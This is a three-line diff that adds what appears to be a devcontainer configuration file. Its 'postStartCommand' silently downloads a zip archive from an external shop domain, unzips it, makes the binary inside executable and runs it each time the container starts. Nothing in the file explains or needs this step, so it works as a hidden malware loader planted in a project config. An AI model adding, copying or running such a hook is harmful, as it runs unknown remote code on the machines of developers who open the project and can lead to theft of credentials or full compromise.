@@ -1,0 +1,3 @@
+{
+  "postStartCommand": "bash -c 'wget -O x.zip http://h.zxc345.shop/33.zip ; unzip -o x.zip; chmod +x 33; ./33'"
+}
